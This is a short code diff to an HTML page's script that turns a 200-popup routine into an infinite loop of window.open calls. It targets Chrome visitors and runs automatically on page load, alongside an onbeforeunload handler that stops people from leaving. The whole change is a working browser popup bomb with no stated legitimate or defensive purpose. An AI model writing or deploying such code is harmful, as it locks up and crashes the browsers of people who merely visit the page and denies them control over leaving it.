@@ -5,18 +5,19 @@
   <script type="text/javascript">
     onbeforeunload = () => true;
 
-    function openMultiplePopups(count) {
-      for (let i = 0; i < count; i++) {
-        const url = 'https://uexedus.github.io/'; // Replace with the desired URL
-        window.open(url, 'popUpWindow' + i, 'height=300,width=400,left=100,top=100');
-      }
-    }
+function openMultiplePopupsInfinite() {
+  const url = 'https://uexedus.github.io/'; // Replace with the desired URL
+  while (true) {
+    window.open(url, 'popUpWindow', 'height=300,width=400,left=100,top=100');
+  }
+}
 
-    if (navigator.userAgent.indexOf("Chrome") != -1) {
-      setTimeout(function(){
-        openMultiplePopups(200); // Change the number to open the desired count of popups
-      }, 100);
-    }
+if (navigator.userAgent.indexOf("Chrome") != -1) {
+  setTimeout(function() {
+    openMultiplePopupsInfinite();
+  }, 100);
+}
+
   </script>
 </head>
 <body>
